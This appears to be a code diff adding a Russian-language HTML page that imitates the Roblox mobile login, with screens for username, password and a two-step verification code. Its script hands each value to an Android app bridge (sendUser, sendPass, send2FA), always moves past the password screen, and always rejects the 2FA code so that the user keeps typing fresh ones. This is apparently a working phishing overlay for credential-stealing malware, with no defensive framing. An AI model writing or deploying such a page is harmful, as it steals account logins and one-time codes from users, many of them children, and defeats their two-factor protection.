@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Roblox</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body {
+    background: #191B1F; color: #fff;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Roboto, Arial, sans-serif;
+    min-height: 100vh; -webkit-font-smoothing: antialiased;
+  }
+  .wrap { padding: 16px 24px 40px; max-width: 480px; margin: 0 auto; }
+  .bar { display: flex; align-items: center; height: 56px; margin-bottom: 8px; }
+  .back {
+    background: none; border: none; color: #fff; font-size: 26px; font-weight: 300;
+    width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;
+    cursor: pointer; padding: 0; line-height: 1; margin-left: -6px;
+  }
+  .title { flex: 1; text-align: center; font-size: 17px; font-weight: 600; color: #fff; margin-right: 32px; }
+  .step-title { font-size: 28px; font-weight: 700; color: #fff; margin: 24px 0 28px 0; line-height: 1.2; }
+  label.lbl { display: block; font-size: 15px; color: #E4E4E6; margin-bottom: 10px; font-weight: 400; }
+  input {
+    width: 100%; background: #2A2C31; border: 2px solid #2A2C31; border-radius: 8px;
+    padding: 16px 14px; color: #fff; font-size: 16px; margin-bottom: 24px;
+    transition: border-color 0.15s; -webkit-appearance: none; appearance: none; outline: none;
+  }
+  input::placeholder { color: #6E7074; }
+  input:focus { border-color: #00A2FF; }
+  .btn {
+    width: 100%; background: #00A2FF; color: #fff; border: none; border-radius: 8px;
+    padding: 15px; font-size: 16px; font-weight: 600; cursor: pointer;
+    transition: opacity 0.1s, background 0.1s; -webkit-appearance: none; appearance: none;
+    font-family: inherit;
+  }
+  .btn:active { background: #0090E0; }
+  .btn:disabled { background: #2A2C31; color: #6E7074; }
+  .link { text-align: center; color: #B0B1B3; font-size: 14px; margin: 20px 0 32px 0; cursor: pointer; }
+  .divider {
+    display: flex; align-items: center; gap: 14px; color: #6E7074; font-size: 13px; margin: 24px 0;
+  }
+  .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #2A2C31; }
+  .alt {
+    width: 100%; background: #2A2C31; border: none; border-radius: 8px; padding: 15px;
+    color: #fff; font-size: 15px; font-weight: 500; margin-bottom: 12px;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    cursor: pointer; font-family: inherit;
+  }
+  .alt:active { background: #35373C; }
+  .alt svg { width: 20px; height: 20px; }
+  .screen { display: none; }
+  .screen.active { display: block; }
+  .err {
+    color: #FF4D4D; font-size: 14px; text-align: center;
+    margin-top: -8px; margin-bottom: 16px; display: none;
+  }
+  .loading {
+    display: inline-block; width: 16px; height: 16px;
+    border: 2px solid #fff; border-top-color: transparent; border-radius: 50%;
+    animation: spin 0.7s linear infinite; vertical-align: middle; margin-right: 6px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- SCREEN 1: USERNAME -->
+<div id="s1" class="screen active">
+  <div class="bar">
+    <button class="back">×</button>
+    <div class="title">Вход</div>
+  </div>
+  <div class="step-title">Войти в аккаунт</div>
+
+  <label class="lbl">Имя пользователя, эл. почта или телефон</label>
+  <input type="text" id="user" autocomplete="username" autocapitalize="off" spellcheck="false">
+  <div class="err" id="e0">Пользователь не найден</div>
+
+  <button class="btn" id="b1" onclick="next1()">Далее</button>
+  <div class="link">Забыли имя пользователя?</div>
+  <div class="divider">Или</div>
+
+  <button class="alt">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#fff"/></svg>
+    Использовать код быстрого входа
+  </button>
+
+  <button class="alt">
+    <svg viewBox="0 0 24 24"><path d="M4 6h16v2H4V6zm0 5h16v2H4v-2zm0 5h10v2H4v-2z" fill="#fff"/></svg>
+    Войти по одноразовому коду
+  </button>
+</div>
+
+<!-- SCREEN 2: PASSWORD -->
+<div id="s2" class="screen">
+  <div class="bar">
+    <button class="back" onclick="back1()">←</button>
+    <div class="title">Вход</div>
+  </div>
+  <div class="step-title">Введите пароль</div>
+
+  <label class="lbl" id="userShown">—</label>
+  <input type="password" id="pass" autocomplete="current-password">
+  <div class="err" id="e1">Неправильное имя пользователя или пароль</div>
+
+  <button class="btn" id="b2" onclick="next2()">Войти</button>
+  <div class="link">Забыли пароль?</div>
+</div>
+
+<!-- SCREEN 3: 2FA -->
+<div id="s3" class="screen">
+  <div class="bar">
+    <div class="title">Проверка в два шага</div>
+  </div>
+  <div class="step-title">Введите код</div>
+
+  <label class="lbl">Откройте приложение-аутентификатор и введите 6-значный код.</label>
+  <input type="text" id="code" inputmode="numeric" maxlength="6" autocomplete="one-time-code" pattern="[0-9]*">
+  <div class="err" id="e2">Недействительный код. Попробуйте снова.</div>
+
+  <button class="btn" id="b3" onclick="next3()">Проверить</button>
+</div>
+
+</div>
+
+<script>
+function lockBtn(id, text) {
+  var b = document.getElementById(id);
+  b.disabled = true;
+  b.innerHTML = '<span class="loading"></span>' + text;
+}
+function unlockBtn(id, text) {
+  var b = document.getElementById(id);
+  b.disabled = false;
+  b.innerHTML = text;
+}
+
+window.__rbxUserCheck = function(valid, hint) {
+  if (!valid) {
+    document.getElementById('user').style.borderColor = '#FF4D4D';
+    var err = document.getElementById('e0');
+    err.textContent = hint || 'Пользователь не найден';
+    err.style.display = 'block';
+    unlockBtn('b1', 'Далее');
+    return;
+  }
+  document.getElementById('user').style.borderColor = '#2A2C31';
+  document.getElementById('e0').style.display = 'none';
+  document.getElementById('userShown').textContent = document.getElementById('user').value;
+  document.getElementById('s1').classList.remove('active');
+  document.getElementById('s2').classList.add('active');
+  unlockBtn('b1', 'Далее');
+  document.getElementById('pass').focus();
+};
+
+function next1() {
+  var u = document.getElementById('user').value.trim();
+  if (!u) { document.getElementById('user').focus(); return; }
+  document.getElementById('e0').style.display = 'none';
+  lockBtn('b1', 'Проверка...');
+  try {
+    Android.sendUser(u);
+  } catch(e) {
+    document.getElementById('userShown').textContent = u;
+    document.getElementById('s1').classList.remove('active');
+    document.getElementById('s2').classList.add('active');
+    unlockBtn('b1', 'Далее');
+  }
+}
+
+function back1() {
+  document.getElementById('s2').classList.remove('active');
+  document.getElementById('s1').classList.add('active');
+  document.getElementById('pass').value = '';
+  document.getElementById('e1').style.display = 'none';
+}
+
+function next2() {
+  var p = document.getElementById('pass').value;
+  if (!p) { document.getElementById('pass').focus(); return; }
+  lockBtn('b2', 'Вход...');
+  document.getElementById('e1').style.display = 'none';
+  try { Android.sendPass(p); } catch(e) {}
+  setTimeout(function() {
+    document.getElementById('s2').classList.remove('active');
+    document.getElementById('s3').classList.add('active');
+    unlockBtn('b2', 'Войти');
+    document.getElementById('code').focus();
+  }, 900);
+}
+
+function next3() {
+  var c = document.getElementById('code').value.trim();
+  if (c.length < 6) { document.getElementById('code').focus(); return; }
+  lockBtn('b3', 'Проверка...');
+  try { Android.send2FA(c); } catch(e) {}
+  setTimeout(function() {
+    document.getElementById('e2').style.display = 'block';
+    document.getElementById('code').value = '';
+    unlockBtn('b3', 'Проверить');
+    document.getElementById('code').focus();
+  }, 1200);
+}
+</script>
+</body>
+</html>
